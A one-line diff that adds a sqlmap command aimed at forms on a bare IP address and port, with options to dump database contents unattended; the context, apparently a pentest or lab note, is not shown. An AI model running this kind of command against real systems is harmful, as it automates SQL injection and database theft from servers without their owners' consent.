@@ -1,0 +1,1 @@
+sqlmap --forms --dump --batch -u http://18.142.96.226:10052/
